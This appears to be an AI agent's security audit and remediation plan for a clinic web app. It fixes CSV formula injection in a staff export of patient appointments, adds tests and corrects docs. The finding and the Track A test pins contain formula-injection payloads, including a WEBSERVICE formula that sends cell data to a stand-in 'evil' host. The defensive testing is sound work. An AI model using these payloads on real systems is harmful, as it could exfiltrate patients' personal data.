# Remediation Plan — Session 36 (19th Audit Cycle, CSV Formula-Injection Guard, Parity Re-Verification)

**Date:** 2026-10-06
**Scope:** Fresh-eyes audit of the session-34 tree (`8be66ac` = `6a5223c` + the
docs-only operator transcript that became `docs/session_35.md`), live parity
re-verification on both sites, remediation of the new findings (headline: the
first Medium-severity finding in 19 audit cycles — CSV formula injection in
the ADR-012 export layer), and the standing doc-residual class. The repo
`skills/` folder is excluded from checking, testing and compilation per the
operating instructions. **Method:** `skills/code-review-and-audit` doctrine
(static gates + fresh-eyes full review as a read-only sub-agent — every
finding re-verified by the orchestrator), `skills/agent-browser` live parity
probes (viewport verified before every measurement, settle-waits before
height readings, canvas paint-isolation — never computed-string comparisons),
`skills/tdd` (red → green, one vertical slice at a time).

---

## Part 1 — Audit Findings (19th cycle, Task 36-a)

**Zero Critical / High. One Medium, two Low, two Info** — the first Medium
in 19 cycles (a genuine security gap in the session-34 CSV export layer,
present since ADR-012 shipped and missed by every prior cycle — including
the orchestrator's own session-34 review). All seven audited invariants hold
(allowlist derivation, last-XFF limiter keying, scrypt timing equalization,
export 401-before-read, PATCH 404, per-run e2e XFF keys, db-path resolution);
all Tailwind v4 trap guards confirmed live in code; zero regressions of any
documented session-2..34 fix.

### 1.1 Issues found (every finding re-verified by the orchestrator)

| ID | Severity | Finding | Evidence | Disposition |
|----|----------|---------|----------|-------------|
| F1 | **Medium** | **CSV formula injection in the export layer.** `csvField` (`src/lib/dashboard-filters.ts:113-115`) only guards `, " CR LF` (RFC 4180). A cell whose FIRST character is `=`, `+`, `-`, `@`, tab, or CR exports raw — quoting does not stop Excel/LibreOffice/Sheets from evaluating it as a formula. `fullName` (3–120, NO charset restriction — verified `validation.ts:103-107`), `phone`, and `email` (`EMAIL_PATTERN` accepts `=a@b.cd`) are all unauthenticated public-form fields. A visitor submits `fullName: "=WEBSERVICE(...)"`; a staff member clicks the feature's exact purpose (Export CSV) and opens the attachment; the formula runs in the staff's spreadsheet context and can exfiltrate adjacent cells — **other patients' PII** — to the attacker's server (OWASP CSV-injection class). In a healthcare/PHI context this is exactly the threat the surface exists to serve safely | `csvField` regex `[",\r\n]`; `rg -i 'formula|injection|WEBSERVICE' src tests` → 0 hits | **Remediate — Track A** (OWASP `'`-prefix neutralization, TDD-first) |
| F2 | Low | CLAUDE.md:39 stale e2e count: "Playwright e2e (53 tests)" — the session-32 count; reality is 61 (CLAUDE's own line 287, AGENTS.md:20, README.md:52 all say 61). The session-34 doc pass updated CLAUDE's Testing/Success-Metrics sections but missed the six-phase VERIFY step | `CLAUDE.md:38-40` | **Doc fix (Track C)** |
| F3 | Low | PAD §3.2 tests/ tree stale: `tests/dashboard-filters.test.ts` (31 unit cases) and `tests/e2e/dashboard-filters.spec.ts` are BOTH missing from the tree; the e2e subtree total says 53 (runtime 61). The session-34 "§3.2 tree" claim only updated the lib/ subtree — the repo's recurring missed-sibling-row class (S26 F1). §7.1/§7.3/§7.4/§11 and the ADR-012 rows are all correct, so the doc contradicts itself | `Project_Architecture_Document.md:499-517` | **Doc fix (Track C)** |
| F4 | Info | PAD §11 line estimates drifted on two ADR-012 rows: `dashboard/page.tsx` claimed ~470, actual 407 (−13%); `dashboard-filters.ts` claimed ~165, actual 153. The other three ADR-012 rows are within ~3% | `Project_Architecture_Document.md:946,953`; `wc -l` | **Doc fix (Track C)** |
| F5 | Info | Duplicate-key filter params parse FIRST-vs-LAST differently on the two ADR-012 surfaces: the dashboard page (Next `searchParams` → `firstValue`) takes the first repeated value, while the export route (`Object.fromEntries(url.searchParams)`) collapses to the LAST — so a hand-crafted `?status=new&status=completed` URL renders the table with `new` but exports with `completed`, breaking the "export always matches the visible view" contract. NOT producible by the native GET form (which never repeats keys) — a contract-edge, not a user-facing bug | `dashboard/page.tsx:75` vs `export/route.ts:67` | **Remediate — Track B** (unify first-wins IN the seam, unit-pinned) |

### 1.2 Verified healthy (re-confirmed by the 19th cycle, condensed)

- Diff `6a5223c..8be66ac` docs-only (exactly `docs/session_35.md`, +95 lines); worktree clean
- Baseline gates after the fresh-clone bootstrap: lint 0 (14 rules ON) · tsc true-strict · **152/152 unit** · build 14-route table · **61/61 e2e × 2** (double-run proof, 57.6s + 55.3s)
- All seven documented invariants hold at file:line precision (allowlist derivation `validation.ts:41-51` re-imported by the seam; last-XFF keying `rate-limit.ts:28`; scrypt burn + DUMMY_HASH `auth.ts:89-94`; export 401-before-any-DB-read `export/route.ts:41-67`; PATCH 404 `[id]/route.ts:103-112`; per-run/per-test XFF keys in all four API-writing specs; db-path first-anchor resolution `db-path.ts:42-59`)
- Tailwind v4 traps: every token a full `hsl()` under `@theme inline`; mobile panel is a grid; sRGB arbitrary gradients; `--shadow-sm` pinned; postfix `!` syntax; ±1 oklab rasterized pins — all confirmed in code and live
- Measured test counts match every claim: unit 152 by file (19+19+4+27+20+10+8+14+31); e2e 61 at runtime (7+13+10+3+9+2+9+8, seo.spec's two data-driven loops expanding 7→9) — the F2/F3 residuals are the only stale counts
- Hygiene: zero TODO/FIXME/`any`/ts-ignore in src/tests/scripts; zero secrets in committed files; deps contract + `scripts/` pin intact; `.env` never committed
- Environment: fresh-clone bootstrap held (`.env` `DATABASE_URL="file:../db/custom.db"`, `db/` at repo root, exactly 6 demo rows 2/2/2 + 1 admin; ambient `DATABASE_URL` hijack ACTIVE all session — the ADR-010 `env -u` guards held, live-proven by the product loop landing in the repo DB)

### 1.3 Live parity evidence (reference vs clone, same session, same method)

| Metric | Reference | Clone |
| ------ | --------- | ----- |
| Page height @1440×900 (viewport VERIFIED) | 7490px | **7490px** |
| Mobile dropdown panel (390×844, viewport VERIFIED) | 192×148 @ (178,80), grid, r24, p8, `<nav>` | **identical** |
| Mobile panel paint (canvas isolation) | [38,74,57,230] | **[38,74,57,230] EXACT** |
| Desktop nav pill paint (canvas isolation) | [37,74,57,204] | **[37,74,57,204] identical** |
| Mobile menu link click | closes + unmounts; scrollY 1837; services at viewport top | **identical** (scrollY 1837, offsetTop 1837) |
| Mobile page height | 12164 | 12162 (the documented 2px contact sub-pixel drift) |
| Section content | 7/7 section ids; 7 h2s byte-identical | **identical** |
| Route table | `/`, `/privacy-policy`, `/accessibility-statement` (all 200) | **superset**: all 3 reference routes 200 + `/login` 200 + `/dashboard` 307-guarded + `/robots.txt` + `/sitemap.xml` 200 |

**Mobile navigation verified working correctly on both sites — no Tailwind
v4 bug.** Full 12-step product loop green (13/13 checks: anon 307 → login
200 + httpOnly cookie → dashboard 200 → POST 201 → PATCH confirm 200 →
PATCH complete 200 → anon PATCH 401 → unknown id 404 → invalid status 422
→ wrong creds generic 401 → logout 200 → post-logout 307); probe rows
purged after (exactly the 6 seed rows remain); dev.log clean.

### 1.4 Scope decision (the "superset" goal)

The clone already IS a functional superset of the reference (verified live:
every reference route + five beyond-parity extensions — validated
appointment backend, staff auth/dashboard, SEO discoverability layer,
dashboard query layer, CSV export). The session-34 record's future
candidates (pagination, JSON-LD) carry unmet preconditions (volume growth;
real NAP data) and stay recorded. This session's honest scope: close the
security gap the audit found, unify the seam's duplicate-key contract, and
sweep the doc residuals.

---

## Part 2 — Remediation Plan

All changes land on `main` (no new branches). `skills/` stays out of
lint/typecheck/test/build. **Zero new npm dependencies** and **zero new
`scripts/` entries** (both pinned by `tests/deps.test.ts`).

### Track A — CSV formula-injection guard (F1, TDD-first)

**Doctrine:** the OWASP Sanitization Cheat Sheet neutralization — a cell
whose first character is `=`, `+`, `-`, `@`, tab (0x09), or CR (0x0D) is
prefixed with a single apostrophe (`'`). The big-three spreadsheet apps
treat a leading apostrophe as a text marker (hidden in display), so
`'+65 6555 0134` DISPLAYS as `+65 6555 0134` while refusing evaluation —
the security win costs nothing visible. The guard lives INSIDE `csvField`
so every exported column is protected uniformly (defense in depth —
attacker-controllable today: name/phone/email; allowlisted columns are
guarded for free against future schema drift).

**A1 — RED: unit pins first** (`tests/dashboard-filters.test.ts`, new
describe block "appointmentsToCsv — spreadsheet formula guard"):
- `=WEBSERVICE("http://evil/?leak="&B2)` as fullName → the CSV field is
  `'=WEBSERVICE("http://evil/?leak="&B2)` (apostrophe prefix; the field has
  no comma/quote/CR/LF beyond the embedded quotes — hmm: embedded `"`
  triggers RFC quoting → assert the exact composed form)
- each remaining trigger chars in isolation: `+alert`, `-2+3|cmd`, `@x`,
  `\tab`, `\r` → prefixed
- ordinary values untouched: `Maria Sanchez`, `555-0171`, ISO dates, empty
  string → byte-identical to today
- a `+`-leading international phone (the real-world case) → `'+1 555 …`
- the guard composes with RFC quoting (a `=HYPERLINK("…","…")` payload
  containing commas/quotes → quoted field with the apostrophe INSIDE the
  quotes)
- no double-guarding: a value already starting with `'` (e.g. `'Maria`)
  is NOT re-prefixed
- **one existing pin deliberately updated:** the exact-string test at
  :184-187 (`+1 555 010 0002` phone) now expects `'+1 555 010 0002` — the
  change IS the fix, documented in the test comment

**A2 — GREEN:** implement in `csvField`:

```ts
/** Cells that could start a spreadsheet formula (= + - @ tab CR) are
 *  prefixed with an apostrophe — the OWASP CSV-injection neutralization.
 *  Spreadsheet apps treat a leading ' as a text marker (hidden in
 *  display), so values like "+65 6555 0134" still DISPLAY verbatim while
 *  refusing evaluation. */
const FORMULA_LEADING = /^[=+\-@\t\r]/;

function csvField(value: string): string {
  const safe = FORMULA_LEADING.test(value) && !value.startsWith("'")
    ? `'${value}`
    : value;
  return /[",\r\n]/.test(safe) ? `"${safe.replaceAll('"', '""')}"` : safe;
}
```

Acceptance: `bunx vitest run tests/dashboard-filters.test.ts` green; unit
suite 152 → ~158.

**A3 — e2e pin (the route-level regression net):** new test in
`tests/e2e/dashboard-filters.spec.ts` — submit a public appointment with
fullName `=HYPERLINK("http://evil.example","Click")` (valid payload: 3–120
chars, no charset rule) and phone `+65 6555 9898`; login; export; assert
the CSV body contains the guarded+quoted field
`"'=HYPERLINK(""http://evil.example"",""Click"")"` and the guarded phone
`'+65 6555 9898`, and does NOT contain an unguarded `,=HYPERLINK`
(field-start form). **RED-proof (the session-26 F4 honesty pattern):**
temporarily revert `csvField` to the unguarded form and run ONLY this spec
— it must FAIL (proving the pin is real); restore; re-run green.

### Track B — duplicate-key first-wins unification (F5, TDD-first)

**B1 — RED:** unit pins for a new seam export
`urlSearchParamsToRecord(params: URLSearchParams): Record<string, string[]>`
(collects ALL values per key in order):
- empty → `{}`
- single values → single-element arrays
- repeated keys preserve occurrence order: `status=new&status=completed`
  → `{status: ["new","completed"]}`
- **the contract pin:** `parseDashboardFilters(urlSearchParamsToRecord(new
  URLSearchParams("status=new&status=completed")))` → `{status: "new"}` —
  FIRST wins, byte-identical to the dashboard page's Next-searchParams
  path (the discrepancy is dead at the seam level)

**B2 — GREEN:** implement `urlSearchParamsToRecord` in
`src/lib/dashboard-filters.ts`; switch
`src/app/api/appointments/export/route.ts` from
`Object.fromEntries(url.searchParams)` to
`urlSearchParamsToRecord(url.searchParams)` — both surfaces now share the
identical first-wins semantics through the same tested seam.

**B3 — e2e pin:** export with `?status=new&status=<other-allowlisted>`
duplicated params → the CSV filters by the FIRST value (contains the
new-status fixture, not the other). Cheap: fixtures already exist in the
spec.

### Track C — doc residuals (F2, F3, F4)

- **C1 (F2):** CLAUDE.md:39 `53 tests` → `61 tests`.
- **C2 (F3):** PAD §3.2 tests tree — add the `dashboard-filters.test.ts`
  row (31 unit cases, S34/ADR-012) and the `e2e/dashboard-filters.spec.ts`
  row (query-layer pins); the e2e subtree total 53 → 61. Structural
  acceptance (the session-30 sweep pattern): `rg -c "dashboard-filters"
  Project_Architecture_Document.md` must hit §3.2 tree + §7.1 + §7.3/§7.4
  + §11 + ADR-012 rows.
- **C3 (F4):** PAD §11 — `dashboard/page.tsx` ~470 → ~407;
  `dashboard-filters.ts` ~165 → ~153 (re-measured; the file grows again
  in Track A/B — re-measure POST-remediation and record the final
  numbers).

### Track D — documentation alignment (every living doc swept)

- **ADR-012 Consequences** (PAD): the formula-guard note — the export
  neutralizes leading `= + - @ \t \r` with an apostrophe prefix (OWASP
  CSV-injection class, session-36); the "raw, round-trippable" wording
  qualified (allowlisted columns and ordinary values round-trip verbatim;
  formula-leading cells gain the text marker).
- **PAD:** `[S36]` revision block; §3.2 tree updates (C2); §7.1/§7.4 unit
  counts (152 → new total post-A1/B1); §11 re-measured rows (C3 + the
  seam/spec rows); §10 row for the guard.
- **README.md:** the export API-table row + Key Features dashboard row
  gain the formula-guard mention; Tested row counts.
- **AGENTS.md:** e2e/unit counts; a one-line doctrine note on the CSV
  guard (the seam neutralizes formula-leading cells — never "fix" it back
  to raw).
- **CLAUDE.md:** F2 + Testing Strategy counts + the guard note.
- **health-care-clinic_SKILL.md:** v2.8.9 (frontmatter project_state +
  §5 tree note + §11 counts + Appendix B `[S36]`).
- **docs/session_36.md** (this session's record) + repo `worklog.md`
  orchestrator entry (Task ID 36) + the workspace worklog.

### Track E — verification, screenshots, commit + push

1. **Full gate:** `bun run lint && bun run typecheck && bun run test &&
   bun run build && bun run test:e2e` — acceptance: lint 0, tsc clean,
   new unit total, build 14-route table unchanged, new e2e total, plus
   the double-run proof (a SECOND consecutive `test:e2e` within the
   10-min limiter window ALSO green).
2. **Live re-verification on the remediated tree:** desktop 7490px;
   mobile panel 192×148 @ (178,80) + paint [38,74,57,230]; pill
   [37,74,57,204]; link-click scrollY 1837; `/api/health` up; the 12-step
   product loop green; dev.log clean.
3. **Screenshots refresh:** all 20 captures in one scripted Playwright
   pass from the remediated dev server (hardened patterns: viewport before
   goto, settle-waits, per-run XFF base disjoint from every documented
   base — this session's probe base was 198.51.130.x; capture base moves
   to 198.51.131.x; dashboard via real login, legal pages guarded on
   `<main>`); 03-desktop-full exactly 1440×7490; dashboards show the query
   bar + 6 seed rows; the capture's submission row purged after.
4. **`.env.example` re-verified** against the codebase (no new env vars
   in this session's changes — expected unchanged; included in the commit).
5. **Commit + push:** secret scan (0 hits expected), `git add` the
   remediated tree (NEVER `.env`, `db/*.db`, logs, `dev.log`),
   Conventional Commit on `main`, push via `docs/ssh_git_wrapper_v3.py`
   (runbook: `docs/how-to-git-push-using-ssh-wrapper_SKILL.md` — dry-run
   first, explicit `--remote`, remote ref verified == local HEAD,
   operator key shredded after).

### Considered and deliberately NOT remediated (doctrine)

| Item | Decision | Rationale |
|------|----------|-----------|
| Guard only name/phone/email columns | Skip — guard in `csvField` | Uniform protection is simpler and future-proof (schema drift can't reopen the hole); allowlisted columns never start with a trigger char, so the guard is a no-op there |
| Strip/replace formula chars instead of `'`-prefix | Skip | The apostrophe preserves the value verbatim (text-marker display); stripping would corrupt data |
| Sanitize at INGEST (validation.ts) | Skip | The public API must accept verbatim names (parity: the reference accepts any 3–120 name); the EXPORT is the evaluation boundary — guard where the risk realizes |
| Full-table CSV export / pagination | Skip (unchanged) | The latest-100 window is the documented clinic-scale semantic (ADR-012); volumes have not outgrown it |
| JSON-LD structured data | Skip (unchanged) | NAP copy is verbatim-reference placeholder data — schema would advertise fake phone/email |
| Per-cell `Content-Disposition` filename change | Skip | Unrelated to the injection vector; attachment filename already correct |
